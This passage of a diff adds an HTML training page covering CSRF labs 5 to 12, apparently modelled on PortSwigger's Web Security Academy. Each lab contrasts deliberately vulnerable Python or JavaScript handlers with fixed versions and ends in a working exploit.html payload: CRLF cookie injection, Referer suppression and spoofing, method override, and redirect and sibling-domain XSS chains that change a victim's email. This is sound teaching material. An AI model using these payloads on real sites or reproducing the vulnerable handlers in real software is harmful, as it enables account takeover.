+<span class="vuln-line">    expected_token = hmac.new(csrf_key.encode(), b'csrf', 'sha256').hexdigest()</span>
+<span class="vuln-line">    if csrf_token != expected_token:</span>
+        abort(403)
+
+    # Problem: If attacker can inject csrfKey cookie,
+    # they can calculate matching token!
+    new_email = request.form.get('email')
+    current_user.email = new_email
+    return redirect('/my-account')
+
+# Cookie injection possible via:
+# - CRLF injection in headers
+# - Subdomain XSS/control
+# - Cookie tossing from sibling domain</code></pre>
+                        </div>
+                    </div>
+                    <div class="code-container hidden" id="lab5-secure">
+                        <div class="code-header"><div class="code-filename"><i class="fab fa-python"></i><span>csrf_handler.py (Secure)</span></div></div>
+                        <div class="code-block">
+                            <pre><code class="language-python">@app.route('/my-account/change-email', methods=['POST'])
+@login_required
+def change_email():
+<span class="secure-line">    # ✅ CSRF token tied to SESSION (not separate cookie)</span>
+<span class="secure-line">    session_id = session.get('id')</span>
+    csrf_token = request.form.get('csrf')
+
+<span class="secure-line">    # ✅ Token derived from session secret</span>
+<span class="secure-line">    expected_token = session.get('csrf_token')</span>
+
+<span class="secure-line">    if not expected_token or not secrets.compare_digest(csrf_token, expected_token):</span>
+        abort(403)
+
+    new_email = request.form.get('email')
+    current_user.email = new_email
+    return redirect('/my-account')
+
+<span class="secure-line"># ✅ Key fix: Token tied to authenticated session</span>
+<span class="secure-line"># Not a separate injectable cookie</span>
+<span class="secure-line"># Attacker cannot control session cookie</span></code></pre>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="payload-section">
+                    <h3><i class="fas fa-code"></i> Exploitation</h3>
+                    <div class="payload-box">
+                        <span class="payload-label">Cookie injection + CSRF attack (exploit.html)</span>
+&lt;html&gt;
+&lt;body&gt;
+    &lt;!-- Step 1: Inject csrfKey cookie via vulnerable endpoint --&gt;
+    &lt;img src="https://vulnerable-website.com/search?q=test%0d%0aSet-Cookie:%20csrfKey=attackerkey" onerror="step2()"&gt;
+
+    &lt;!-- Step 2: Submit form with matching token --&gt;
+    &lt;form id="csrf" action="https://vulnerable-website.com/my-account/change-email" method="POST"&gt;
+        &lt;input type="hidden" name="email" value="attacker@evil.com"&gt;
+        &lt;input type="hidden" name="csrf" value="TOKEN_CALCULATED_FROM_ATTACKERKEY"&gt;
+    &lt;/form&gt;
+    &lt;script&gt;
+        function step2() {
+            document.getElementById('csrf').submit();
+        }
+    &lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+
+&lt;!-- Attacker injects their own csrfKey cookie
+     Then submits matching CSRF token they calculated
+     Server validates token against injected cookie --&gt;
+                    </div>
+                </div>
+            </div>
+            <!-- Lab 6: Token Duplicated in Cookie -->
+            <div id="lab6-duplicated-cookie" class="lab-content hidden">
+                <div class="lab-header">
+                    <h2><i class="fas fa-clone"></i> Lab 6: CSRF Token Duplicated in Cookie (Double Submit)</h2>
+                    <div class="lab-meta">
+                        <div class="meta-item"><i class="fas fa-layer-group"></i><span>PortSwigger Web Security Academy</span></div>
+                        <div class="meta-item"><i class="fas fa-signal"></i><span>Difficulty: Practitioner</span></div>
+                    </div>
+                    <p class="lab-description">
+                        The application uses "double submit cookie" pattern where the CSRF token in the form is compared
+                        against a csrf cookie. If attacker can inject cookies, they control both values.
+                    </p>
+                </div>
+
+                <div class="vuln-section">
+                    <h3><i class="fas fa-bug"></i> The Vulnerability</h3>
+                    <ul class="vuln-list">
+                        <li>Double submit pattern: form token compared to cookie token</li>
+                        <li>Server doesn't maintain any server-side state for tokens</li>
+                        <li>If attacker can set cookies, they can set matching values</li>
+                        <li>Cookie injection breaks the entire protection mechanism</li>
+                    </ul>
+                </div>
+
+                <div class="code-review-section">
+                    <div class="code-tabs">
+                        <button class="code-tab active" data-view="vulnerable" data-lab="lab6"><i class="fas fa-exclamation-triangle"></i> Vulnerable Code</button>
+                        <button class="code-tab secure" data-view="secure" data-lab="lab6"><i class="fas fa-shield-alt"></i> Secure Code</button>
+                    </div>
+                    <div class="code-container" id="lab6-vulnerable">
+                        <div class="code-header"><div class="code-filename"><i class="fab fa-python"></i><span>csrf_handler.py</span></div></div>
+                        <div class="code-block">
+                            <pre><code class="language-python">@app.route('/my-account/change-email', methods=['POST'])
+@login_required
+def change_email():
+<span class="vuln-line">    # ❌ "Double Submit Cookie" pattern</span>
+<span class="vuln-line">    cookie_token = request.cookies.get('csrf')</span>
+    form_token = request.form.get('csrf')
+
+<span class="vuln-line">    # ❌ Simply compares cookie value to form value</span>
+<span class="vuln-line">    # No server-side state verification!</span>
+<span class="vuln-line">    if cookie_token != form_token:</span>
+        abort(403)
+
+    # If attacker can set csrf cookie to "fake",
+    # and form has csrf="fake", validation passes!
+    new_email = request.form.get('email')
+    current_user.email = new_email
+    return redirect('/my-account')
+
+# Vulnerability: No server-side token storage
+# Attacker controls BOTH the cookie AND form value</code></pre>
+                        </div>
+                    </div>
+                    <div class="code-container hidden" id="lab6-secure">
+                        <div class="code-header"><div class="code-filename"><i class="fab fa-python"></i><span>csrf_handler.py (Secure)</span></div></div>
+                        <div class="code-block">
+                            <pre><code class="language-python">@app.route('/my-account/change-email', methods=['POST'])
+@login_required
+def change_email():
+<span class="secure-line">    # ✅ Use signed double submit with HMAC</span>
+<span class="secure-line">    # Token = HMAC(session_id, secret_key)</span>
+<span class="secure-line">    expected_token = generate_signed_token(session['id'])</span>
+    form_token = request.form.get('csrf')
+
+<span class="secure-line">    # ✅ Token is cryptographically bound to session</span>
+<span class="secure-line">    if not secrets.compare_digest(form_token, expected_token):</span>
+        abort(403)
+
+    new_email = request.form.get('email')
+    current_user.email = new_email
+    return redirect('/my-account')
+
+<span class="secure-line">def generate_signed_token(session_id):</span>
+<span class="secure-line">    # ✅ Signed with server secret - cannot be forged</span>
+<span class="secure-line">    return hmac.new(SECRET_KEY, session_id.encode(), 'sha256').hexdigest()</span>
+
+<span class="secure-line"># ✅ Alternative: Store token server-side in session</span>
+<span class="secure-line"># session['csrf_token'] = secrets.token_hex(32)</span></code></pre>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="payload-section">
+                    <h3><i class="fas fa-code"></i> Exploitation</h3>
+                    <div class="payload-box">
+                        <span class="payload-label">Cookie injection + double submit bypass (exploit.html)</span>
+&lt;html&gt;
+&lt;body&gt;
+    &lt;!-- Inject csrf cookie with attacker-controlled value --&gt;
+    &lt;img src="https://vulnerable-website.com/search?q=test%0d%0aSet-Cookie:%20csrf=fake" onerror="exploit()"&gt;
+
+    &lt;form id="csrf" action="https://vulnerable-website.com/my-account/change-email" method="POST"&gt;
+        &lt;input type="hidden" name="email" value="attacker@evil.com"&gt;
+        &lt;!-- Form token matches injected cookie value --&gt;
+        &lt;input type="hidden" name="csrf" value="fake"&gt;
+    &lt;/form&gt;
+    &lt;script&gt;
+        function exploit() {
+            document.getElementById('csrf').submit();
+        }
+    &lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+
+&lt;!-- Attack flow:
+     1. Inject csrf cookie = "fake" via CRLF/subdomain
+     2. Submit form with csrf = "fake"
+     3. Server compares cookie to form: "fake" == "fake" ✓
+     4. Attack succeeds! --&gt;
+                    </div>
+                </div>
+            </div>
+            <!-- Lab 7: Referer Validation if Present -->
+            <div id="lab7-referer-present" class="lab-content hidden">
+                <div class="lab-header">
+                    <h2><i class="fas fa-eye-slash"></i> Lab 7: CSRF Referer Validation Only if Present</h2>
+                    <div class="lab-meta">
+                        <div class="meta-item"><i class="fas fa-layer-group"></i><span>PortSwigger Web Security Academy</span></div>
+                        <div class="meta-item"><i class="fas fa-signal"></i><span>Difficulty: Practitioner</span></div>
+                    </div>
+                    <p class="lab-description">
+                        The application validates the Referer header when present but allows requests through if the
+                        Referer header is missing entirely. Using referrer-policy, attackers can suppress the header.
+                    </p>
+                </div>
+
+                <div class="vuln-section">
+                    <h3><i class="fas fa-bug"></i> The Vulnerability</h3>
+                    <ul class="vuln-list">
+                        <li>Referer header validated only when it exists</li>
+                        <li>Missing Referer header = no validation</li>
+                        <li>Attacker can suppress Referer using meta tag or header</li>
+                        <li>referrer-policy: no-referrer removes the header entirely</li>
+                    </ul>
+                </div>
+
+                <div class="code-review-section">
+                    <div class="code-tabs">
+                        <button class="code-tab active" data-view="vulnerable" data-lab="lab7"><i class="fas fa-exclamation-triangle"></i> Vulnerable Code</button>
+                        <button class="code-tab secure" data-view="secure" data-lab="lab7"><i class="fas fa-shield-alt"></i> Secure Code</button>
+                    </div>
+                    <div class="code-container" id="lab7-vulnerable">
+                        <div class="code-header"><div class="code-filename"><i class="fab fa-python"></i><span>csrf_handler.py</span></div></div>
+                        <div class="code-block">
+                            <pre><code class="language-python">@app.route('/my-account/change-email', methods=['POST'])
+@login_required
+def change_email():
+    referer = request.headers.get('Referer')
+
+<span class="vuln-line">    # ❌ Only validates Referer if header is present</span>
+<span class="vuln-line">    if referer:</span>
+<span class="vuln-line">        if 'vulnerable-website.com' not in referer:</span>
+<span class="vuln-line">            abort(403, "Invalid referer")</span>
+<span class="vuln-line">    # ❌ If referer is None/missing, validation skipped!</span>
+
+    new_email = request.form.get('email')
+    current_user.email = new_email
+    db.session.commit()
+    return redirect('/my-account')
+
+# Attacker uses: &lt;meta name="referrer" content="no-referrer"&gt;
+# This causes browser to send NO Referer header
+# Server skips validation entirely!</code></pre>
+                        </div>
+                    </div>
+                    <div class="code-container hidden" id="lab7-secure">
+                        <div class="code-header"><div class="code-filename"><i class="fab fa-python"></i><span>csrf_handler.py (Secure)</span></div></div>
+                        <div class="code-block">
+                            <pre><code class="language-python">@app.route('/my-account/change-email', methods=['POST'])
+@login_required
+def change_email():
+    referer = request.headers.get('Referer')
+
+<span class="secure-line">    # ✅ Referer MUST be present</span>
+<span class="secure-line">    if not referer:</span>
+<span class="secure-line">        abort(403, "Missing Referer header")</span>
+
+<span class="secure-line">    # ✅ Referer MUST match our domain</span>
+<span class="secure-line">    parsed = urlparse(referer)</span>
+<span class="secure-line">    if parsed.netloc != 'vulnerable-website.com':</span>
+<span class="secure-line">        abort(403, "Invalid referer")</span>
+
+    new_email = request.form.get('email')
+    current_user.email = new_email
+    db.session.commit()
+    return redirect('/my-account')
+
+<span class="secure-line"># ✅ Better: Use CSRF tokens instead of Referer</span>
+<span class="secure-line"># Referer can be blocked by proxies, privacy extensions</span>
+<span class="secure-line"># CSRF tokens are more reliable protection</span></code></pre>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="payload-section">
+                    <h3><i class="fas fa-code"></i> Exploitation</h3>
+                    <div class="payload-box">
+                        <span class="payload-label">Suppress Referer header (exploit.html)</span>
+&lt;html&gt;
+&lt;head&gt;
+    &lt;!-- Suppress Referer header completely --&gt;
+    &lt;meta name="referrer" content="no-referrer"&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;form action="https://vulnerable-website.com/my-account/change-email" method="POST"&gt;
+        &lt;input type="hidden" name="email" value="attacker@evil.com"&gt;
+    &lt;/form&gt;
+    &lt;script&gt;
+        document.forms[0].submit();
+    &lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+
+&lt;!-- Browser sends request WITHOUT Referer header
+     Server: "No referer? Skip validation!"
+     Attack succeeds --&gt;
+                    </div>
+                </div>
+            </div>
+            <!-- Lab 8: Broken Referer Validation -->
+            <div id="lab8-referer-broken" class="lab-content hidden">
+                <div class="lab-header">
+                    <h2><i class="fas fa-bug"></i> Lab 8: CSRF with Broken Referer Validation</h2>
+                    <div class="lab-meta">
+                        <div class="meta-item"><i class="fas fa-layer-group"></i><span>PortSwigger Web Security Academy</span></div>
+                        <div class="meta-item"><i class="fas fa-signal"></i><span>Difficulty: Practitioner</span></div>
+                    </div>
+                    <p class="lab-description">
+                        The application validates the Referer header but uses a weak check that only verifies the domain
+                        appears somewhere in the header. Attackers can bypass by including the domain in their URL.
+                    </p>
+                </div>
+
+                <div class="vuln-section">
+                    <h3><i class="fas fa-bug"></i> The Vulnerability</h3>
+                    <ul class="vuln-list">
+                        <li>Referer validation uses substring check instead of exact match</li>
+                        <li>Checks if domain "contains" target, not if it "equals" target</li>
+                        <li>Attacker embeds valid domain in their URL path or query</li>
+                        <li>Example: attacker.com/?vulnerable-website.com passes check</li>
+                    </ul>
+                </div>
+
+                <div class="code-review-section">
+                    <div class="code-tabs">
+                        <button class="code-tab active" data-view="vulnerable" data-lab="lab8"><i class="fas fa-exclamation-triangle"></i> Vulnerable Code</button>
+                        <button class="code-tab secure" data-view="secure" data-lab="lab8"><i class="fas fa-shield-alt"></i> Secure Code</button>
+                    </div>
+                    <div class="code-container" id="lab8-vulnerable">
+                        <div class="code-header"><div class="code-filename"><i class="fab fa-python"></i><span>csrf_handler.py</span></div></div>
+                        <div class="code-block">
+                            <pre><code class="language-python">@app.route('/my-account/change-email', methods=['POST'])
+@login_required
+def change_email():
+    referer = request.headers.get('Referer')
+
+    if not referer:
+        abort(403, "Missing Referer")
+
+<span class="vuln-line">    # ❌ Weak validation: substring check!</span>
+<span class="vuln-line">    if 'vulnerable-website.com' not in referer:</span>
+<span class="vuln-line">        abort(403, "Invalid referer")</span>
+
+    # Problem: These ALL pass the check:
+    # ✓ https://vulnerable-website.com/page
+    # ✓ https://attacker.com/?vulnerable-website.com  (BYPASS!)
+    # ✓ https://attacker.com/vulnerable-website.com   (BYPASS!)
+
+    new_email = request.form.get('email')
+    current_user.email = new_email
+    return redirect('/my-account')</code></pre>
+                        </div>
+                    </div>
+                    <div class="code-container hidden" id="lab8-secure">
+                        <div class="code-header"><div class="code-filename"><i class="fab fa-python"></i><span>csrf_handler.py (Secure)</span></div></div>
+                        <div class="code-block">
+                            <pre><code class="language-python">from urllib.parse import urlparse
+
+@app.route('/my-account/change-email', methods=['POST'])
+@login_required
+def change_email():
+    referer = request.headers.get('Referer')
+
+    if not referer:
+        abort(403, "Missing Referer")
+
+<span class="secure-line">    # ✅ Parse URL and check exact domain match</span>
+<span class="secure-line">    parsed = urlparse(referer)</span>
+<span class="secure-line">    if parsed.netloc != 'vulnerable-website.com':</span>
+<span class="secure-line">        abort(403, "Invalid referer")</span>
+
+    # Now these correctly fail:
+    # ✓ https://vulnerable-website.com/page  (valid)
+    # ✗ https://attacker.com/?vulnerable-website.com (BLOCKED)
+    # ✗ https://attacker.com/vulnerable-website.com  (BLOCKED)
+
+    new_email = request.form.get('email')
+    current_user.email = new_email
+    return redirect('/my-account')
+
+<span class="secure-line"># ✅ Key: Parse URL properly, check netloc (host) only</span>
+<span class="secure-line"># Don't use substring matching on full URL!</span></code></pre>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="payload-section">
+                    <h3><i class="fas fa-code"></i> Exploitation</h3>
+                    <div class="payload-box">
+                        <span class="payload-label">Include target domain in query string (exploit.html)</span>
+&lt;html&gt;
+&lt;head&gt;
+    &lt;!-- Force Referer to include full URL with query --&gt;
+    &lt;meta name="referrer" content="unsafe-url"&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;!-- Host this at: https://attacker.com/?vulnerable-website.com --&gt;
+    &lt;form action="https://vulnerable-website.com/my-account/change-email" method="POST"&gt;
+        &lt;input type="hidden" name="email" value="attacker@evil.com"&gt;
+    &lt;/form&gt;
+    &lt;script&gt;
+        // Ensure history contains the bypass URL
+        history.pushState("", "", "/?vulnerable-website.com");
+        document.forms[0].submit();
+    &lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+
+&lt;!-- Referer header: https://attacker.com/?vulnerable-website.com
+     Server checks: "vulnerable-website.com" in referer? YES!
+     Attack succeeds due to weak substring check --&gt;
+                    </div>
+                </div>
+            </div>
+            <!-- Lab 9: SameSite Lax Method Override -->
+            <div id="lab9-samesite-method" class="lab-content hidden">
+                <div class="lab-header">
+                    <h2><i class="fas fa-sync-alt"></i> Lab 9: SameSite Lax Bypass via Method Override</h2>
+                    <div class="lab-meta">
+                        <div class="meta-item"><i class="fas fa-layer-group"></i><span>PortSwigger Web Security Academy</span></div>
+                        <div class="meta-item"><i class="fas fa-signal"></i><span>Difficulty: Practitioner</span></div>
+                    </div>
+                    <p class="lab-description">
+                        The application uses SameSite=Lax cookies, which only send cookies with top-level GET navigations.
+                        However, the server accepts _method parameter to override HTTP method, allowing GET-based CSRF.
+                    </p>
+                </div>
+
+                <div class="vuln-section">
+                    <h3><i class="fas fa-bug"></i> The Vulnerability</h3>
+                    <ul class="vuln-list">
+                        <li>SameSite=Lax blocks cookies on cross-site POST requests</li>
+                        <li>But cookies ARE sent with top-level GET navigations</li>
+                        <li>Server supports _method=POST parameter override</li>
+                        <li>Attacker uses GET request with _method=POST to bypass SameSite</li>
+                    </ul>
+                </div>
+
+                <div class="code-review-section">
+                    <div class="code-tabs">
+                        <button class="code-tab active" data-view="vulnerable" data-lab="lab9"><i class="fas fa-exclamation-triangle"></i> Vulnerable Code</button>
+                        <button class="code-tab secure" data-view="secure" data-lab="lab9"><i class="fas fa-shield-alt"></i> Secure Code</button>
+                    </div>
+                    <div class="code-container" id="lab9-vulnerable">
+                        <div class="code-header"><div class="code-filename"><i class="fab fa-python"></i><span>app.py</span></div></div>
+                        <div class="code-block">
+                            <pre><code class="language-python"><span class="vuln-line"># ❌ Method override middleware enabled</span>
+<span class="vuln-line">app.config['HTTP_METHOD_OVERRIDE'] = True</span>
+
+@app.before_request
+def method_override():
+<span class="vuln-line">    # Allows _method parameter to override HTTP method</span>
+<span class="vuln-line">    if request.method == 'GET' and '_method' in request.args:</span>
+<span class="vuln-line">        request.environ['REQUEST_METHOD'] = request.args['_method'].upper()</span>
+
+@app.route('/my-account/change-email', methods=['POST'])
+@login_required
+def change_email():
+    # SameSite=Lax cookie is sent because browser sees top-level GET
+    # But server treats it as POST due to _method override!
+    new_email = request.form.get('email') or request.args.get('email')
+    current_user.email = new_email
+    return redirect('/my-account')
+
+# Attack URL:
+# GET /my-account/change-email?email=attacker@evil.com&_method=POST
+# Browser: sends Lax cookies (it's a GET)
+# Server: processes as POST (due to _method)</code></pre>
+                        </div>
+                    </div>
+                    <div class="code-container hidden" id="lab9-secure">
+                        <div class="code-header"><div class="code-filename"><i class="fab fa-python"></i><span>app.py (Secure)</span></div></div>
+                        <div class="code-block">
+                            <pre><code class="language-python"><span class="secure-line"># ✅ Disable method override completely</span>
+<span class="secure-line">app.config['HTTP_METHOD_OVERRIDE'] = False</span>
+
+<span class="secure-line"># ✅ Or if needed, only allow from POST body, not URL params</span>
+@app.before_request
+def method_override():
+<span class="secure-line">    # Only override from POST body, never GET params</span>
+<span class="secure-line">    if request.method == 'POST' and '_method' in request.form:</span>
+<span class="secure-line">        request.environ['REQUEST_METHOD'] = request.form['_method'].upper()</span>
+
+@app.route('/my-account/change-email', methods=['POST'])
+@login_required
+def change_email():
+<span class="secure-line">    # ✅ Validate CSRF token for true POST protection</span>
+<span class="secure-line">    validate_csrf_token(request.form.get('csrf'))</span>
+
+<span class="secure-line">    # ✅ Only accept email from POST body</span>
+<span class="secure-line">    new_email = request.form.get('email')</span>
+    current_user.email = new_email
+    return redirect('/my-account')
+
+<span class="secure-line"># ✅ Use SameSite=Strict for sensitive actions</span>
+<span class="secure-line"># response.set_cookie('session', value, samesite='Strict')</span></code></pre>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="payload-section">
+                    <h3><i class="fas fa-code"></i> Exploitation</h3>
+                    <div class="payload-box">
+                        <span class="payload-label">GET request with method override (exploit.html)</span>
+&lt;html&gt;
+&lt;body&gt;
+    &lt;!-- Use top-level navigation to send SameSite=Lax cookies --&gt;
+    &lt;script&gt;
+        // This is a GET request (Lax cookies sent)
+        // But _method=POST makes server treat it as POST
+        document.location = 'https://vulnerable-website.com/my-account/change-email?email=attacker@evil.com&_method=POST';
+    &lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+
+&lt;!-- Alternative: Use form with GET method --&gt;
+&lt;form action="https://vulnerable-website.com/my-account/change-email" method="GET"&gt;
+    &lt;input type="hidden" name="email" value="attacker@evil.com"&gt;
+    &lt;input type="hidden" name="_method" value="POST"&gt;
+&lt;/form&gt;
+&lt;script&gt;document.forms[0].submit();&lt;/script&gt;
+
+&lt;!-- Browser sends Lax cookies with GET navigation
+     Server sees _method=POST and processes as POST request --&gt;
+                    </div>
+                </div>
+            </div>
+            <!-- Lab 10: SameSite Strict Client Redirect -->
+            <div id="lab10-samesite-redirect" class="lab-content hidden">
+                <div class="lab-header">
+                    <h2><i class="fas fa-directions"></i> Lab 10: SameSite Strict Bypass via Client-Side Redirect</h2>
+                    <div class="lab-meta">
+                        <div class="meta-item"><i class="fas fa-layer-group"></i><span>PortSwigger Web Security Academy</span></div>
+                        <div class="meta-item"><i class="fas fa-signal"></i><span>Difficulty: Practitioner</span></div>
+                    </div>
+                    <p class="lab-description">
+                        SameSite=Strict cookies are not sent on any cross-site requests. However, if the same-site has a
+                        client-side redirect (like JavaScript-based redirect), it can be chained to execute a same-site POST.
+                    </p>
+                </div>
+
+                <div class="vuln-section">
+                    <h3><i class="fas fa-bug"></i> The Vulnerability</h3>
+                    <ul class="vuln-list">
+                        <li>SameSite=Strict blocks all cross-site requests initially</li>
+                        <li>Once on same-site, subsequent requests include cookies</li>
+                        <li>Client-side redirects (JS) on same domain act as same-site</li>
+                        <li>Open redirect or post-login redirect can be exploited</li>
+                    </ul>
+                </div>
+
+                <div class="code-review-section">
+                    <div class="code-tabs">
+                        <button class="code-tab active" data-view="vulnerable" data-lab="lab10"><i class="fas fa-exclamation-triangle"></i> Vulnerable Code</button>
+                        <button class="code-tab secure" data-view="secure" data-lab="lab10"><i class="fas fa-shield-alt"></i> Secure Code</button>
+                    </div>
+                    <div class="code-container" id="lab10-vulnerable">
+                        <div class="code-header"><div class="code-filename"><i class="fab fa-js"></i><span>redirect.js (on vulnerable-website.com)</span></div></div>
+                        <div class="code-block">
+                            <pre><code class="language-javascript">// Post-confirmation redirect page: /post/comment/confirmation
+// URL: /post/comment/confirmation?postId=5
+
+<span class="vuln-line">// ❌ Client-side redirect using URL parameter</span>
+const urlParams = new URLSearchParams(window.location.search);
+const postId = urlParams.get('postId');
+
+<span class="vuln-line">// ❌ No validation of redirect destination</span>
+<span class="vuln-line">// Attacker can inject path traversal</span>
+setTimeout(() =&gt; {
+<span class="vuln-line">    window.location = '/post/' + postId;</span>
+}, 3000);
+
+// Attack: postId=../my-account/change-email?email=attacker@evil.com
+// Results in: /post/../my-account/change-email?email=attacker@evil.com
+// Browser normalizes to: /my-account/change-email?email=attacker@evil.com
+
+// Since this is client-side redirect ON same-site,
+// SameSite=Strict cookies ARE included!</code></pre>
+                        </div>
+                    </div>
+                    <div class="code-container hidden" id="lab10-secure">
+                        <div class="code-header"><div class="code-filename"><i class="fab fa-js"></i><span>redirect.js (Secure)</span></div></div>
+                        <div class="code-block">
+                            <pre><code class="language-javascript"><span class="secure-line">// ✅ Validate redirect parameter</span>
+const urlParams = new URLSearchParams(window.location.search);
+const postId = urlParams.get('postId');
+
+<span class="secure-line">// ✅ Validate postId is numeric only</span>
+<span class="secure-line">if (!/^\d+$/.test(postId)) {</span>
+<span class="secure-line">    window.location = '/error';</span>
+<span class="secure-line">} else {</span>
+<span class="secure-line">    setTimeout(() =&gt; {</span>
+<span class="secure-line">        window.location = '/post/' + postId;</span>
+<span class="secure-line">    }, 3000);</span>
+<span class="secure-line">}</span>
+
+<span class="secure-line">// ✅ Better: Use server-side redirect instead</span>
+<span class="secure-line">// Server validates and issues 302/303 redirect</span>
+
+<span class="secure-line">// ✅ Additional protections:</span>
+<span class="secure-line">// - Use CSRF tokens for state-changing actions</span>
+<span class="secure-line">// - Require POST method only (not GET)</span>
+<span class="secure-line">// - Validate all user input on server side</span></code></pre>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="payload-section">
+                    <h3><i class="fas fa-code"></i> Exploitation</h3>
+                    <div class="payload-box">
+                        <span class="payload-label">Chain client-side redirect for same-site request (exploit.html)</span>
+&lt;html&gt;
+&lt;body&gt;
+    &lt;script&gt;
+        // Navigate to same-site page with redirect gadget
+        // The path traversal payload makes redirect go to change-email
+        document.location = 'https://vulnerable-website.com/post/comment/confirmation?postId=../my-account/change-email?email=attacker@evil.com%26submit=1';
+    &lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+
+&lt;!-- Attack flow:
+     1. Cross-site GET to /post/comment/confirmation (cookies NOT sent, Strict)
+     2. Page loads, JS executes client-side redirect
+     3. JS redirects to /my-account/change-email?email=attacker@evil.com
+     4. This is now a same-site navigation - cookies ARE sent!
+     5. Email changed with victim's session --&gt;
+                    </div>
+                </div>
+            </div>
+            <!-- Lab 11: SameSite Strict Sibling Domain -->
+            <div id="lab11-samesite-sibling" class="lab-content hidden">
+                <div class="lab-header">
+                    <h2><i class="fas fa-sitemap"></i> Lab 11: SameSite Strict Bypass via Sibling Domain</h2>
+                    <div class="lab-meta">
+                        <div class="meta-item"><i class="fas fa-layer-group"></i><span>PortSwigger Web Security Academy</span></div>
+                        <div class="meta-item"><i class="fas fa-signal"></i><span>Difficulty: Practitioner</span></div>
+                    </div>
+                    <p class="lab-description">
+                        SameSite cookies are based on the registrable domain (eTLD+1), not the exact subdomain. An XSS on a sibling
+                        subdomain can be used to make "same-site" requests that include SameSite=Strict cookies.
+                    </p>
+                </div>
+
+                <div class="vuln-section">
+                    <h3><i class="fas fa-bug"></i> The Vulnerability</h3>
+                    <ul class="vuln-list">
+                        <li>SameSite is determined by registrable domain (e.g., example.com)</li>
+                        <li>shop.example.com and cms.example.com are "same-site"</li>
+                        <li>XSS on any subdomain can make same-site requests</li>
+                        <li>Sibling domain XSS bypasses SameSite=Strict completely</li>
+                    </ul>
+                </div>
+
+                <div class="code-review-section">
+                    <div class="code-tabs">
+                        <button class="code-tab active" data-view="vulnerable" data-lab="lab11"><i class="fas fa-exclamation-triangle"></i> Vulnerable Code</button>
+                        <button class="code-tab secure" data-view="secure" data-lab="lab11"><i class="fas fa-shield-alt"></i> Secure Code</button>
+                    </div>
+                    <div class="code-container" id="lab11-vulnerable">
+                        <div class="code-header"><div class="code-filename"><i class="fab fa-python"></i><span>Architecture Overview</span></div></div>
+                        <div class="code-block">
+                            <pre><code class="language-python"># Domain structure:
+# - vulnerable-website.com (main app with SameSite=Strict cookies)
+# - cms.vulnerable-website.com (sibling subdomain with XSS)
+
+<span class="vuln-line"># ❌ Sibling subdomain has XSS vulnerability</span>
+# cms.vulnerable-website.com/login?username=&lt;script&gt;...&lt;/script&gt;
+
+# Main app: vulnerable-website.com
+@app.route('/my-account/change-email', methods=['POST'])
+def change_email():
+    # Uses SameSite=Strict session cookie
+    # Thinks it's protected from cross-site attacks...
+    new_email = request.form.get('email')
+    current_user.email = new_email
+    return redirect('/my-account')
+
+# Problem: XSS on cms.vulnerable-website.com can make
+# "same-site" POST to vulnerable-website.com
+# because they share the same registrable domain!
+
+<span class="vuln-line"># SameSite compares: vulnerable-website.com == vulnerable-website.com ✓</span>
+<span class="vuln-line"># Cookies ARE sent even though origins are different!</span></code></pre>
+                        </div>
+                    </div>
+                    <div class="code-container hidden" id="lab11-secure">
+                        <div class="code-header"><div class="code-filename"><i class="fab fa-python"></i><span>Secure Architecture</span></div></div>
+                        <div class="code-block">
+                            <pre><code class="language-python"><span class="secure-line"># ✅ Defense-in-depth approach:</span>
+
+<span class="secure-line"># 1. Fix XSS on ALL subdomains - no sibling should be vulnerable</span>
+# Sanitize ALL user input, use CSP headers
+
+<span class="secure-line"># 2. Use CSRF tokens even with SameSite cookies</span>
+@app.route('/my-account/change-email', methods=['POST'])
+def change_email():
+<span class="secure-line">    # SameSite=Strict + CSRF token = defense in depth</span>
+<span class="secure-line">    validate_csrf_token(request.form.get('csrf'))</span>
+
+    new_email = request.form.get('email')
+    current_user.email = new_email
+    return redirect('/my-account')
+
+<span class="secure-line"># 3. Consider using separate registrable domains</span>
+# app.example.com for sensitive operations
+# user-content.example.io for untrusted content
+# These are "cross-site" to each other!
+
+<span class="secure-line"># 4. Implement additional origin validation</span>
+<span class="secure-line">origin = request.headers.get('Origin')</span>
+<span class="secure-line">if origin != 'https://vulnerable-website.com':</span>
+<span class="secure-line">    abort(403)  # Block sibling domain requests</span></code></pre>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="payload-section">
+                    <h3><i class="fas fa-code"></i> Exploitation</h3>
+                    <div class="payload-box">
+                        <span class="payload-label">XSS on sibling domain to bypass SameSite (exploit.html)</span>
+&lt;html&gt;
+&lt;body&gt;
+    &lt;script&gt;
+        // Step 1: Navigate to sibling domain with XSS
+        // XSS payload will execute in sibling domain context
+        document.location = 'https://cms.vulnerable-website.com/login?username=' +
+            encodeURIComponent('&lt;script&gt;' +
+                // Step 2: From sibling domain, make POST to main domain
+                'var f = document.createElement("form");' +
+                'f.method = "POST";' +
+                'f.action = "https://vulnerable-website.com/my-account/change-email";' +
+                'var e = document.createElement("input");' +
+                'e.name = "email";' +
+                'e.value = "attacker@evil.com";' +
+                'f.appendChild(e);' +
+                'document.body.appendChild(f);' +
+                'f.submit();' +
+            '&lt;/script&gt;');
+    &lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+
+&lt;!-- Attack flow:
+     1. XSS executes on cms.vulnerable-website.com
+     2. JS creates form POST to vulnerable-website.com
+     3. Browser considers this "same-site" (same eTLD+1)
+     4. SameSite=Strict cookies ARE included!
+     5. Email changed on main app --&gt;
+                    </div>
+                </div>
+            </div>
+            <!-- Lab 12: SameSite Lax Cookie Refresh -->
+            <div id="lab12-samesite-refresh" class="lab-content hidden">
+                <div class="lab-header">
+                    <h2><i class="fas fa-redo"></i> Lab 12: SameSite Lax Bypass via Cookie Refresh</h2>
+                    <div class="lab-meta">
+                        <div class="meta-item"><i class="fas fa-layer-group"></i><span>PortSwigger Web Security Academy</span></div>
